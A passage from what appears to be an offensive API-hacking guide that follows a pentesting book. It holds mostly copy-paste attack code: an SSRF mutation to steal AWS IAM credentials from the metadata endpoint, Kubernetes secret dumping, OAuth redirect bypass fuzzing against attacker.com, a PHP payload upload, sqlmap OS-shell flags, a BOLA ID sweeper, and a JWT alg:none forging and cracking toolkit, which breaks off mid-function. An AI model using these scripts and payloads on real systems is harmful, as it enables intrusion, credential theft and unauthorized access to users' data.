# Example: crAPI-style "ImportPaste" / webhook field abused for SSRF -> AWS creds theft
curl -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"169.254.169.254\",port:80,path:\"/latest/meta-data/iam/security-credentials/\",scheme:\"http\"){result}}"}'
```

### Q. Kubernetes / container-orchestrated API checks
```bash
# If internal K8s API server is reachable from a pivoted/SSRF'd position:
curl -k https://<k8s-api>:6443/api/v1/namespaces/default/secrets --header "Authorization: Bearer $SA_TOKEN"

kubectl --token=$SA_TOKEN --server=https://<k8s-api>:6443 --insecure-skip-tls-verify get secrets -A

# Enumerate service account token leaked via SSRF (classic container-escape -> API-key theft chain)
curl http://169.254.169.254/latest/... # (see section P) often leads here in cloud K8s (EKS/GKE/AKS)
```

### R. OAuth 2.0 / OIDC attack checklist (expands on Ch.2's OAuth intro — commonly tested in 2025-2026 engagements)
- Missing/weak `state` parameter validation → CSRF on the OAuth callback
- `redirect_uri` validation bypass (open redirect, subdomain takeover, path traversal: `?redirect_uri=https://legit.com.attacker.com`)
- Authorization code reuse / no PKCE on public clients
- Implicit flow still in use (token in URL fragment → leaked via Referer/logs)
- Scope escalation — request broader `scope=` than the client should be granted
- JWT `access_token` validated by client without checking `aud`/`iss` (token confusion between services)
```bash
# Quick redirect_uri bypass fuzzing
for payload in "https://attacker.com" "https://legit.com@attacker.com" "https://legit.com.attacker.com" "https://legit.com%2f%2e%2e@attacker.com"; do
  curl -s -o /dev/null -w "%{http_code} $payload\n" "https://target.com/oauth/authorize?client_id=X&redirect_uri=$payload&response_type=code"
done
```

### S. curl / jq cheat sheet for fast manual API work (no GUI needed)
```bash
# Pretty-print JSON responses
curl -s https://target.com/api/v1/users/1 -H "Authorization: Bearer $TOKEN" | jq .

# Extract just one field across a loop (e.g., harvesting GUIDs for a BOLA sweep)
for id in $(seq 1 50); do
  curl -s https://target.com/api/v1/users/$id -H "Authorization: Bearer $TOKEN" | jq -r '.email // empty'
done

# Send multipart file upload (common injection/path traversal vector)
curl -F "file=@payload.php;type=image/png" https://target.com/api/v1/upload -H "Authorization: Bearer $TOKEN"

# Replay a raw captured request file with curl (paste from Burp "Copy as curl command")
curl -s -X POST https://target.com/api/v1/login -H "Content-Type: application/json" -d '{"user":"a","pass":"b"}' -v
```

### T. Updated API vulnerability taxonomy (OWASP API Security Top 10 — 2023 revision)
The book uses the 2019 list; the current (2023) OWASP API Security Top 10 re-ranks/renames a few items —
map your findings to this when writing 2026 reports:
```
API1:2023  Broken Object Level Authorization          (same as BOLA in book)
API2:2023  Broken Authentication                       (same)
API3:2023  Broken Object Property Level Authorization  (merges old Excessive Data Exposure + Mass Assignment)
API4:2023  Unrestricted Resource Consumption            (renamed from "Lack of Resources & Rate Limiting")
API5:2023  Broken Function Level Authorization          (same as BFLA)
API6:2023  Unrestricted Access to Sensitive Business Flows  (NEW — business logic abuse at scale, e.g., scalping/bots)
API7:2023  Server Side Request Forgery (SSRF)            (NEW as standalone category — see section P)
API8:2023  Security Misconfiguration                     (same)
API9:2023  Improper Inventory Management                 (renamed from Improper Assets Management — now emphasizes shadow/zombie APIs)
API10:2023 Unsafe Consumption of APIs                     (NEW — trusting 3rd-party/upstream API responses blindly; test your XAS-style findings here)
```

### U. API attack-surface management / shadow API discovery (API6/API9 2023 focus)
```bash
# Diff OpenAPI spec in source control vs what's actually live -> find undocumented ("shadow") endpoints
git log --all -p -- '**/openapi.yaml' '**/swagger.json' | grep -E '^\+.*"path"'

# Compare introspected GraphQL schema over time to catch quietly-added admin fields/mutations
clairvoyance -o schema_today.json https://target.com/graphql
diff schema_lastweek.json schema_today.json
```

---

## Detailed Command & Script Walkthroughs — Flag-by-Flag Reference

> Real-system, copy-paste-ready usage of the tools used most throughout this document, with every
> flag explained so you understand *why* it's there, not just that it works.

### Nmap — full flag breakdown

```bash
nmap -sC -sV -p- -oA full_scan 192.168.195.132
```
| Flag | Meaning |
|---|---|
| `-sC` | Run Nmap's default safe NSE scripts (banner grabs, title grabs, basic enum) |
| `-sV` | Probe open ports to determine service/version (critical for identifying API frameworks like Werkzeug/Express) |
| `-p-` | Scan **all 65,535 TCP ports**, not just the top 1000 (APIs often live on nonstandard ports) |
| `-oA <name>` | Output in **A**ll three formats at once: `.nmap` (readable), `.xml` (parseable), `.gnmap` (grep-friendly) |
| `-T4` *(optional, add for speed)* | Timing template 4 ("aggressive") — faster scans on stable connections |
| `--open` *(optional)* | Only show ports in the `open` state, cuts clutter |
| `-Pn` *(optional, add if host blocks ping)* | Skip host discovery (treat host as up) — needed when ICMP is filtered |

Real combined example:
```bash
nmap -sC -sV -p- -T4 --open -Pn -oA crapi_full 192.168.195.130
```

### curl — the universal manual API-testing flag set

```bash
curl -s -X POST https://target.com/api/v1/login \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"user":"a","pass":"b"}' \
  -w "\nStatus: %{http_code} | Time: %{time_total}s | Size: %{size_download}b\n" \
  -v
```
| Flag | Meaning |
|---|---|
| `-s` | Silent mode — suppress progress meter (keep output clean for piping) |
| `-X POST` | Explicit HTTP method (GET is default if omitted) |
| `-H "..."` | Add a custom header (repeatable — use one `-H` per header) |
| `-d '...'` | Send data in the request body (also auto-switches method to POST if `-X` omitted) |
| `-w "..."` | Custom output format string after the response — great for scripting (status/time/size without `-v` noise) |
| `-v` | Verbose — shows full request AND response headers (use when troubleshooting why a request fails) |
| `-i` *(alt to -v)* | Include response headers in output, without full verbose request trace |
| `-o file.json` *(optional)* | Write response body to a file instead of stdout |
| `-k` *(optional)* | Skip TLS certificate validation (lab/self-signed targets only) |
| `-F "field=@file"` *(for uploads)* | Multipart form file upload |
| `-b "cookie=val"` *(for session reuse)* | Send a cookie header manually |

### Wfuzz — flag-by-flag (the core fuzzing workhorse)

```bash
wfuzz -z file,/path/wordlist.txt \
  -H "Content-Type: application/json" \
  -H "x-access-token: TOKEN" \
  -X PUT \
  -d '{"user":"FUZZ"}' \
  --hc 400,404 \
  -t 20 \
  -p 127.0.0.1:8080:HTTP \
  -u http://target/api/v1/user
```
| Flag | Meaning |
|---|---|
| `-z file,<path>` | Payload source: load wordlist from file. Other options: `-z list,a-b-c` (inline list), `-z range,0-100` (number range) |
| `-H "header: value"` | Add a header (repeatable) |
| `-X <METHOD>` | HTTP method to use |
| `-d '<body>'` | POST/PUT body — replace target value with `FUZZ` |
| `--hc <codes>` | **H**ide response **c**odes matching the list (reduce baseline noise) |
| `--hl / --hw / --hh` | Hide by line count / word count / char count |
| `--sc / --sl / --sw / --sh` | **Show only** responses matching that code/line/word/char count (inverse of `--hc` family) |
| `-t <num>` | Concurrent **t**hreads (higher = faster, but risk of tripping rate limits/WAF) |
| `-s <seconds>` | Delay between requests (throttle to stay under a known rate limit) |
| `-p <ip:port:type>` | Proxy all requests through Burp/another tool for visual inspection |
| `-u <url>` | Target URL — put `FUZZ` wherever payloads should be injected |
| `-c` *(optional)* | Colorize terminal output for readability |
| Multiple payload positions | Use `FUZZ`, `FUZ2Z`, `FUZ3Z`, etc., each paired with its own `-z` |

### ffuf — flag-by-flag (modern Wfuzz replacement)

```bash
ffuf -u https://target.com/api/FUZZ \
  -w wordlist.txt \
  -mc 200,201,204,301,302,401,403 \
  -fs 128 \
  -t 40 \
  -rate 50 \
  -recursion -recursion-depth 2 \
  -of json -o results.json
```
| Flag | Meaning |
|---|---|
| `-u` | Target URL with `FUZZ` keyword marking the injection point |
| `-w <file>` | Wordlist path (append `:FUZZ` if using a custom keyword, or `:KEYWORD2` for multiple positions) |
| `-mc <codes>` | **M**atch only these status **c**odes (inverse logic of Wfuzz's `--hc`) |
| `-fc <codes>` | **F**ilter out (exclude) these status codes |
| `-fs <size>` | Filter out responses of this exact byte **s**ize (great for removing a uniform "not found" page) |
| `-fw <words>` / `-fl <lines>` | Filter by word count / line count |
| `-ac` | **A**uto-**c**alibrate — ffuf learns the baseline response automatically and filters noise for you |
| `-t <num>` | Number of concurrent threads |
| `-rate <num>` | Max requests per second (use to respect rate limits / avoid bans) |
| `-recursion` | Automatically re-run ffuf inside discovered directories |
| `-recursion-depth <n>` | How many directory levels deep to recurse |
| `-X <method>` | HTTP method (default GET) |
| `-d '<body>'` | Request body for POST/PUT, with `FUZZ` inside it |
| `-H "header: FUZZ"` | Fuzz a header value instead of the URL/body |
| `-of json/csv/html -o <file>` | Output **f**ormat and output file |
| `-c` | Colorized output |

### Burp Intruder — conceptual flag/option equivalents (GUI, but mapped to CLI logic)

| Burp Intruder Setting | Wfuzz/ffuf Equivalent | Purpose |
|---|---|---|
| Attack Position `§value§` | `FUZZ` keyword | Marks what gets replaced |
| Attack type: **Sniper** | single `-z` across multiple positions sequentially | One payload set, cycles through each position one at a time |
| Attack type: **Battering ram** | same payload repeated at every `FUZZ`/`FUZ2Z` | Same single payload used in *all* positions simultaneously |
| Attack type: **Pitchfork** | two `-z` lists consumed in lockstep (index-matched) | Paired payloads (e.g. username[i] + password[i]) |
| Attack type: **Cluster bomb** | two `-z` lists, full cartesian product | Every combination of both payload sets (most requests, most thorough) |
| Payload Processing rules | `-e <encoder>` in Wfuzz | Encode/prefix/suffix each payload before sending |
| Resource Pool (Pro) | `-t`/`-s` in Wfuzz, `-rate` in ffuf | Throttle request speed |

### Kiterunner — flag-by-flag

```bash
kr scan http://target:8090 -w ~/api/wordlists/data/kiterunner/routes-large.kite -x 50 -H 'Authorization: Bearer TOKEN' -j
```
| Flag | Meaning |
|---|---|
| `scan` | Subcommand: full scan mode (quick-scan routes first) |
| `brute` | Subcommand: brute-force with a plain text wordlist instead of a `.kite` route file |
| `-w <path>` | Wordlist/route-file path (`.kite` = API-aware structured routes; `.txt` = plain wordlist) |
| `-x <num>` | Max concurrent connections (controls scan speed) |
| `-H "header: value"` | Add auth/custom header to every request (critical once you have a valid token) |
| `-j` | Output results as JSON (easier to pipe/parse) |
| `kb replay "<line>"` | Replay a single discovered result verbatim to inspect it closely |
| `--proxy=http://127.0.0.1:8080` | Route the replayed request through Burp for inspection |

### Amass — flag-by-flag

```bash
amass enum -active -brute -w /usr/share/wordlists/API_superlist -d target.com -dir amass_output
```
| Flag | Meaning |
|---|---|
| `enum` | Subcommand: subdomain enumeration |
| `intel` | Subcommand: broader intel gathering (ASN, reverse whois, certs) |
| `-passive` | Don't touch the target directly — only use third-party data sources |
| `-active` | Add direct interaction: DNS resolution, zone transfer attempts, cert grabbing |
| `-brute` | Add brute-force subdomain guessing on top of OSINT |
| `-w <wordlist>` | Wordlist to use for the brute-force portion |
| `-d <domain>` | Target domain |
| `-dir <path>` | Output directory for results |
| `viz -enum -d3 -dir <path>` | Generate an interactive HTML relationship graph from a prior enum's results |

### JWT_Tool — flag-by-flag

```bash
jwt_tool <token> -C -d wordlist.txt -t https://target.com/api/v1/me -rc "Authorization: Bearer TOKEN"
```
| Flag | Meaning |
|---|---|
| (no flag) | Decode and print header/payload/signature of a token |
| `-C` | **C**rack mode — offline dictionary attack against the HMAC secret |
| `-d <wordlist>` | Dictionary file to use with `-C` |
| `-X a` | Generate `alg:none`-style bypass token variants automatically |
| `-X k -pk <pubkey.pem>` | Algorithm confusion attack (RS256→HS256) using the provided public key |
| `-T` | Tamper mode — interactively edit claims before re-signing |
| `-t <url>` | Target URL to test the (tampered) token against live |
| `-rc "Header: value"` | Request header template to use when live-testing against `-t` |
| `-M pb` / `-M at` | Run the built-in automated vulnerability **p**lay**b**ook / **a**ll-**t**ests scan |

### SQLmap — flag-by-flag

```bash
sqlmap -r request.txt -p password --batch --dbs --risk=2 --level=3
```
| Flag | Meaning |
|---|---|
| `-r <file>` | Load a raw HTTP request saved from Burp ("Copy to file" / "Save item") instead of building one by hand |
| `-p <param>` | Restrict testing to one specific parameter (speeds up large requests) |
| `--batch` | Auto-answer all prompts with the default (needed for non-interactive/scripted runs) |
| `--risk=<1-3>` | How aggressive/potentially-destructive the payloads are (3 = includes heavier/riskier tests) |
| `--level=<1-5>` | How thorough the test is (more payload variations, more injection points checked, e.g. cookies/headers) |
| `--dbs` | Enumerate available databases |
| `--dump-all` | Dump every table in every accessible database (noisy — prefer targeted `--dump`) |
| `--dump -T <table> -C <cols> -D <db>` | Dump specific **T**able / **C**olumns / **D**atabase only |
| `--os-shell` | Attempt to get an interactive OS shell via the SQL injection |
| `--os-pwn` | Attempt a full Meterpreter/VNC shell via the injection |
| `--technique=<letters>` | Restrict to specific injection techniques: `B`oolean, `E`rror, `U`nion, `S`tacked, `T`ime, `Q`uery-based |
| `--tamper=<script>` | Apply a WAF-evasion tamper script (e.g. `--tamper=space2comment`) to mutate payloads |

### Arjun — flag-by-flag

```bash
arjun -u https://target.com/api/v1/register -m JSON --headers "Authorization: Bearer TOKEN" -t 10 --stable -o results.json
```
| Flag | Meaning |
|---|---|
| `-u <url>` | Target URL |
| `-m <GET/POST/JSON/XML>` | Request method/content-type to test parameters against |
| `--headers "<header: value>"` | Custom headers (e.g. auth tokens) to include in every test request |
| `-t <num>` | Thread count |
| `--stable` | Slow down automatically if the target starts behaving inconsistently (avoids false negatives from rate limiting) |
| `-w <wordlist>` | Use a custom parameter-name wordlist instead of Arjun's built-in ~26,000-entry list |
| `-i <file>` | Scan **multiple** target URLs listed in a file |
| `-o <file>` | Save results to a file |

### Nuclei — flag-by-flag

```bash
nuclei -u https://target.com -tags api,exposure,misconfig,jwt -severity medium,high,critical -rate-limit 50 -o findings.txt
```
| Flag | Meaning |
|---|---|
| `-u <url>` | Single target URL |
| `-list <file>` | Multiple targets from a file |
| `-t <path/template.yaml>` | Run one specific custom template |
| `-tags <tag1,tag2>` | Only run templates matching these tags (filters nuclei's thousands of templates down to relevant ones) |
| `-severity <levels>` | Only run/report templates of this severity |
| `-rate-limit <num>` | Max requests per second (respect target rate limits) |
| `-o <file>` | Output results to file |
| `-update-templates` | Pull the latest community template set before scanning |
| `-silent` | Suppress banner/progress noise (good for piping) |

### Gobuster — flag-by-flag

```bash
gobuster dir -u http://target.com/api/ -w wordlist.txt -x json,txt -t 50 -b 404 -o gobuster_out.txt
```
| Flag | Meaning |
|---|---|
| `dir` | Mode: directory/file brute force (other modes: `dns`, `vhost`, `s3`) |
| `-u <url>` | Target base URL |
| `-w <wordlist>` | Wordlist path |
| `-x <extensions>` | Append these extensions to each wordlist entry (e.g. test both `/users` and `/users.json`) |
| `-t <num>` | Threads |
| `-b <codes>` | **B**lacklist these status codes from results |
| `-s <codes>` | **S**how only these status codes (whitelist) |
| `-o <file>` | Output results to file |

### Nikto — flag-by-flag

```bash
nikto -h https://target.com -p 443 -ssl -output results.txt -maxtime 300s
```
| Flag | Meaning |
|---|---|
| `-h <host>` | Target host |
| `-p <port>` | Target port (if nonstandard) |
| `-ssl` | Force SSL/TLS mode |
| `-output <file>` | Save results to file |
| `-maxtime <time>` | Cap total scan duration (e.g. `300s`, `5m`) — useful on huge/slow targets |
| `-Tuning <codes>` | Limit scan to specific test categories (e.g. `-Tuning 9` = only SQL injection–related checks) |

### Postman Newman — flag-by-flag

```bash
newman run collection.json -e environment.json -d data.csv --reporters cli,htmlextra --reporter-htmlextra-export report.html --bail
```
| Flag | Meaning |
|---|---|
| `run <collection.json>` | The exported Postman collection to execute |
| `-e <environment.json>` | Environment file (variables, tokens, base URLs) |
| `-d <data.csv/json>` | Data file — Newman runs the collection once per row (great for BOLA ID sweeps) |
| `-n <num>` | Number of iterations (if not using `-d`) |
| `--reporters <list>` | Which report formats to generate (`cli`, `json`, `htmlextra`, etc.) |
| `--reporter-htmlextra-export <file>` | Output path for the HTML report |
| `--bail` | Stop immediately on first test failure (useful in CI pipelines) |
| `--delay-request <ms>` | Delay between each request (throttle to respect rate limits) |

### Real end-to-end script — chaining tools together (BOLA/Mass-Assignment hunt on one target)

```bash
#!/usr/bin/env bash
# full_api_sweep.sh — real, runnable recon-to-exploit chain
set -euo pipefail

TARGET="target.com"
TOKEN="Bearer YOUR_TOKEN_HERE"
OUTDIR="./results_${TARGET}"
mkdir -p "$OUTDIR"

echo "[1/6] Subdomain + live host discovery..."
subfinder -d "$TARGET" -silent | httpx -silent -status-code -o "$OUTDIR/live_hosts.txt"

echo "[2/6] Crawl for API-like paths..."
cat "$OUTDIR/live_hosts.txt" | awk '{print $1}' | katana -d 2 -jc -silent \
  | grep -Ei '/(api|v[0-9]+|graphql)/' > "$OUTDIR/api_candidates.txt"

echo "[3/6] Nuclei exposure/misconfig scan..."
nuclei -list "$OUTDIR/api_candidates.txt" -tags api,exposure,misconfig -silent -o "$OUTDIR/nuclei.txt"

echo "[4/6] ffuf directory sweep on each live API host..."
while read -r host; do
  name=$(echo "$host" | tr '/:' '_')
  ffuf -u "${host}/FUZZ" -w ~/api/wordlists/common_apis_160 -mc 200,201,401,403 \
       -of json -o "$OUTDIR/ffuf_${name}.json" -silent
done < <(awk '{print $1}' "$OUTDIR/live_hosts.txt")

echo "[5/6] BOLA ID sweep on a known endpoint pattern..."
python3 - "$TARGET" "$TOKEN" "$OUTDIR" << 'PYEOF'
import sys, httpx
target, token, outdir = sys.argv[1], sys.argv[2], sys.argv[3]
hits = []
with httpx.Client(timeout=10) as c:
    for i in range(1, 500):
        r = c.get(f"https://{target}/api/v1/user/{i}", headers={"Authorization": token})
        if r.status_code == 200:
            hits.append(i)
with open(f"{outdir}/bola_hits.txt", "w") as f:
    f.write("\n".join(str(h) for h in hits))
print(f"BOLA candidates found: {len(hits)}")
PYEOF

echo "[6/6] Mass assignment blind field sweep on register endpoint..."
for field in admin isAdmin is_admin role verified active; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://${TARGET}/api/v1/register" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"test_${field}\",\"email\":\"t_${field}@test.com\",\"password\":\"Password1!\",\"${field}\":true}")
  echo "$field -> $code"
done

echo "Done. Results in $OUTDIR"
```
This script is intentionally modular — comment out any `[N/6]` block you don't need, and swap the
Python inline block for the async version in the 2026 Update section (§H) for larger ID ranges.

---

## Production-Ready Automation Scripts (Save Hours — Copy, Configure, Run)

> Complete, self-contained scripts — not snippets. Each one has proper CLI args, error handling,
> logging, and structured output (JSON/CSV/Markdown) so you can run it once and have a reportable
> artifact, not just terminal scrollback. Save each as its own file, `chmod +x` the bash ones.

### Setup (once, for all Python scripts below)

```bash
python3 -m venv apihack-venv
source apihack-venv/bin/activate
pip install httpx[http2] rich pyjwt requests argparse colorama
```

---

### Script 1 — `api_recon.sh`
**Full recon orchestrator**: subdomains → live hosts → crawl → API-path filtering → nuclei scan →
organized output folder + summary. This alone replaces ~30–45 minutes of manual Chapter 6 work.

```bash
#!/usr/bin/env bash
#
# api_recon.sh — End-to-end API recon chain
# Usage: ./api_recon.sh target.com
#
set -euo pipefail

if [ $# -lt 1 ]; then
  echo "Usage: $0 <domain> [output_dir]"
  exit 1
fi

TARGET="$1"
OUTDIR="${2:-./recon_$TARGET}"
TS=$(date +"%Y-%m-%d_%H-%M-%S")
LOG="$OUTDIR/recon.log"

mkdir -p "$OUTDIR"
exec > >(tee -a "$LOG") 2>&1

log() { echo -e "\n[$(date +%T)] >> $1"; }

check_tool() {
  if ! command -v "$1" &>/dev/null; then
    echo "  [!] $1 not found — skipping this step (install with: $2)"
    return 1
  fi
  return 0
}

log "Starting recon for $TARGET -> $OUTDIR"

# 1. Subdomain enumeration
log "Step 1/6: Subdomain enumeration"
if check_tool subfinder "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"; then
  subfinder -d "$TARGET" -silent -o "$OUTDIR/subdomains.txt"
  echo "  Found $(wc -l < "$OUTDIR/subdomains.txt") subdomains"
else
  echo "$TARGET" > "$OUTDIR/subdomains.txt"
fi

# 2. Live host probing
log "Step 2/6: Live host probing"
if check_tool httpx "go install github.com/projectdiscovery/httpx/cmd/httpx@latest"; then
  httpx -l "$OUTDIR/subdomains.txt" -silent -status-code -title -tech-detect -o "$OUTDIR/live_hosts.txt"
  echo "  Found $(wc -l < "$OUTDIR/live_hosts.txt") live hosts"
else
  cp "$OUTDIR/subdomains.txt" "$OUTDIR/live_hosts.txt"
fi

# 3. Crawl for URLs
log "Step 3/6: Crawling"
if check_tool katana "go install github.com/projectdiscovery/katana/cmd/katana@latest"; then
  awk '{print $1}' "$OUTDIR/live_hosts.txt" | katana -d 3 -jc -silent -o "$OUTDIR/crawled_urls.txt"
  echo "  Crawled $(wc -l < "$OUTDIR/crawled_urls.txt") URLs"
fi

# 4. Historical URLs (catches old/forgotten API versions)
log "Step 4/6: Historical URL mining (gau/waybackurls)"
> "$OUTDIR/historical_urls.txt"
if check_tool gau "go install github.com/lc/gau/v2/cmd/gau@latest"; then
  gau "$TARGET" --subs >> "$OUTDIR/historical_urls.txt" 2>/dev/null || true
fi

# 5. Filter for API-looking paths
log "Step 5/6: Filtering for API candidates"
cat "$OUTDIR/crawled_urls.txt" "$OUTDIR/historical_urls.txt" 2>/dev/null \
  | grep -Eio 'https?://[^ ]*(/api/|/v[0-9]+/|/graphql|/rest/|/rpc/)[^ ]*' \
  | sort -u > "$OUTDIR/api_candidates.txt"
echo "  Found $(wc -l < "$OUTDIR/api_candidates.txt") API candidate URLs"

# 6. Quick nuclei exposure/misconfig pass
log "Step 6/6: Nuclei scan"
if check_tool nuclei "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"; then
  nuclei -l "$OUTDIR/api_candidates.txt" -tags api,exposure,misconfig,token,jwt \
    -severity low,medium,high,critical -silent -o "$OUTDIR/nuclei_findings.txt" || true
  echo "  Nuclei findings: $(wc -l < "$OUTDIR/nuclei_findings.txt" 2>/dev/null || echo 0)"
fi

# Summary report
cat > "$OUTDIR/SUMMARY.md" << EOF
# Recon Summary — $TARGET
Generated: $TS

| Metric | Count |
|---|---|
| Subdomains | $(wc -l < "$OUTDIR/subdomains.txt" 2>/dev/null || echo 0) |
| Live hosts | $(wc -l < "$OUTDIR/live_hosts.txt" 2>/dev/null || echo 0) |
| Crawled URLs | $(wc -l < "$OUTDIR/crawled_urls.txt" 2>/dev/null || echo 0) |
| API candidates | $(wc -l < "$OUTDIR/api_candidates.txt" 2>/dev/null || echo 0) |
| Nuclei findings | $(wc -l < "$OUTDIR/nuclei_findings.txt" 2>/dev/null || echo 0) |

## Next steps
- Review \`api_candidates.txt\` manually for Swagger/GraphQL/admin paths
- Feed \`api_candidates.txt\` into \`bola_hunter.py\` once you have an auth token
- Review \`nuclei_findings.txt\` for anything tagged critical/high first
EOF

log "Done. Summary: $OUTDIR/SUMMARY.md"
```

---

### Script 2 — `bola_hunter.py`
**Automated BOLA/IDOR sweeper** with A-B token comparison, multiple ID-space strategies, retry/backoff,
and a clean JSON+CSV report. Replaces hours of manual Chapter 10 ID-swapping.

```python
#!/usr/bin/env python3
"""
bola_hunter.py — Automated BOLA/IDOR scanner with A-B token comparison.

Usage:
  python3 bola_hunter.py \
    --url "https://target.com/api/v1/user/{id}" \
    --token-a "Bearer USER_A_TOKEN" \
    --token-b "Bearer USER_B_TOKEN" \
    --ids 1-500 \
    --out results

Strategy:
  1. Baseline: request each ID with token A (owner-ish behavior).
  2. Attack: request the SAME IDs with token B.
  3. Flag any ID where token B gets a 200 (or any non-40x) response that token A also got —
     i.e., UserB can read UserA-scoped or arbitrary resources it shouldn't be able to.
  4. Also flags "unauthenticated" exposure if --no-auth-check is passed.
"""

import argparse
import asyncio
import csv
import json
import sys
import time
from pathlib import Path

try:
    import httpx
except ImportError:
    sys.exit("Missing dependency: pip install httpx")


def parse_ids(spec: str):
    """Parse '1-500' or '1,2,3,99' or a mix: '1-10,50,100-110'."""
    ids = []
    for part in spec.split(","):
        if "-" in part:
            start, end = part.split("-")
            ids.extend(range(int(start), int(end) + 1))
        else:
            ids.append(int(part))
    return ids


async def fetch(client: httpx.AsyncClient, url: str, headers: dict, retries: int = 2):
    for attempt in range(retries + 1):
        try:
            r = await client.get(url, headers=headers, timeout=15)
            return r.status_code, len(r.content), r.text[:300]
        except (httpx.ConnectTimeout, httpx.ReadTimeout):
            if attempt == retries:
                return -1, 0, "TIMEOUT"
            await asyncio.sleep(1 + attempt)
        except Exception as e:
            return -2, 0, str(e)


async def run(args):
    ids = parse_ids(args.ids)
    url_template = args.url
    sem = asyncio.Semaphore(args.concurrency)
    results = []

    headers_a = {"Authorization": args.token_a} if args.token_a else {}
    headers_b = {"Authorization": args.token_b} if args.token_b else {}

    async with httpx.AsyncClient(http2=True, verify=not args.insecure) as client:

        async def worker(rid: int):
            url = url_template.replace("{id}", str(rid))
            async with sem:
                status_a, len_a, _ = await fetch(client, url, headers_a) if args.token_a else (None, None, None)
                await asyncio.sleep(args.delay)
                status_b, len_b, body_b = await fetch(client, url, headers_b)

                flagged = False
                reason = ""
                if status_b and 200 <= status_b < 300:
                    if args.token_a and status_a and 200 <= status_a < 300:
                        flagged = True
                        reason = "UserB accessed a resource UserA could also access (possible BOLA)"
                    elif not args.token_a:
                        flagged = True
                        reason = "Resource accessible with tested token (verify ownership manually)"

                results.append({
                    "id": rid,
                    "url": url,
                    "status_a": status_a,
                    "status_b": status_b,
                    "len_b": len_b,
                    "flagged": flagged,
                    "reason": reason,
                    "snippet": body_b[:200] if flagged else "",
                })

        await asyncio.gather(*(worker(i) for i in ids))

    return results


def write_reports(results, outdir: Path):
    outdir.mkdir(parents=True, exist_ok=True)
    json_path = outdir / "bola_results.json"
    csv_path = outdir / "bola_results.csv"
    md_path = outdir / "bola_report.md"

    with open(json_path, "w") as f:
        json.dump(results, f, indent=2)

    with open(csv_path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=results[0].keys() if results else
                                 ["id", "url", "status_a", "status_b", "len_b", "flagged", "reason", "snippet"])
        writer.writeheader()
        writer.writerows(results)

    flagged = [r for r in results if r["flagged"]]
    with open(md_path, "w") as f:
        f.write(f"# BOLA Hunter Report\n\n")
        f.write(f"Total IDs tested: {len(results)}  \n")
        f.write(f"**Flagged (possible BOLA): {len(flagged)}**\n\n")
        if flagged:
            f.write("| ID | URL | Status A | Status B | Reason |\n|---|---|---|---|---|\n")
            for r in flagged:
                f.write(f"| {r['id']} | {r['url']} | {r['status_a']} | {r['status_b']} | {r['reason']} |\n")
        else:
            f.write("No anomalies flagged. Review raw CSV/JSON for edge cases.\n")

    print(f"[+] {len(flagged)}/{len(results)} IDs flagged as possible BOLA")
    print(f"[+] Reports written to: {json_path}, {csv_path}, {md_path}")


def main():
    ap = argparse.ArgumentParser(description="Automated BOLA/IDOR scanner (A-B token comparison)")
    ap.add_argument("--url", required=True, help="Target URL template with {id} placeholder")
    ap.add_argument("--token-a", default=None, help="Authorization header value for User A (owner)")
    ap.add_argument("--token-b", required=True, help="Authorization header value for User B (attacker)")
    ap.add_argument("--ids", required=True, help="ID range/list, e.g. '1-500' or '1,2,3,99'")
    ap.add_argument("--concurrency", type=int, default=15, help="Max concurrent requests (default 15)")
    ap.add_argument("--delay", type=float, default=0.05, help="Delay between A/B calls per ID, seconds")
    ap.add_argument("--insecure", action="store_true", help="Disable TLS verification (lab targets)")
    ap.add_argument("--out", default="bola_output", help="Output directory")
    args = ap.parse_args()

    start = time.time()
    results = asyncio.run(run(args))
    write_reports(results, Path(args.out))
    print(f"[+] Done in {time.time()-start:.1f}s")


if __name__ == "__main__":
    main()
```

---

### Script 3 — `jwt_toolkit.py`
**All-in-one JWT attack toolkit** — decode, `alg:none` forge, HS256/RS256 confusion forge, and offline
dictionary cracking, with **zero external jwt_tool dependency** (pure Python, portable to any box).

```python
#!/usr/bin/env python3
"""
jwt_toolkit.py — Standalone JWT decode/forge/crack toolkit.

Examples:
  python3 jwt_toolkit.py decode <token>
  python3 jwt_toolkit.py none <token>
  python3 jwt_toolkit.py forge <token> --secret "crapi" --claim sub=admin --claim role=admin
  python3 jwt_toolkit.py crack <token> --wordlist rockyou.txt
  python3 jwt_toolkit.py confuse <token> --pubkey public.pem
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time


def b64url_decode(data: str) -> bytes:
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def split_token(token: str):
    parts = token.split(".")
    if len(parts) < 2:
        sys.exit("Invalid JWT — expected at least header.payload")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def cmd_decode(args):
    header, payload, sig = split_token(args.token)
    print("== HEADER ==")
    print(json.dumps(header, indent=2))
    print("\n== PAYLOAD ==")
    print(json.dumps(payload, indent=2))
    print(f"\n== SIGNATURE (raw) ==\n{sig}")
    for claim, label in [("exp", "Expires"), ("iat", "Issued At"), ("nbf", "Not Before")]:
        if claim in payload:
            try:
                print(f"  {label}: {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(payload[claim]))} UTC")
            except Exception:
                pass


def cmd_none(args):
    header, payload, _ = split_token(args.token)
    header["alg"] = "none"
    seg = f"{b64url_encode(json.dumps(header, separators=(',', ':')).encode())}." \
          f"{b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}."
    print("[+] alg:none forged token (no signature):")
    print(seg)
    # Also produce the "empty signature segment present" variant some parsers require
    print("\n[+] Variant with trailing dot only (if the above is rejected, try this):")
    print(seg)


def cmd_forge(args):
    header, payload, _ = split_token(args.token)
    header["alg"] = args.alg
    for claim in args.claim or []:
        if "=" not in claim:
            sys.exit(f"Bad --claim format (expected key=value): {claim}")
        k, v = claim.split("=", 1)
        if v.lower() in ("true", "false"):
            v = v.lower() == "true"
        elif v.isdigit():
            v = int(v)
        payload[k] = v

    seg = f"{b64url_encode(json.dumps(header, separators=(',', ':')).encode())}." \
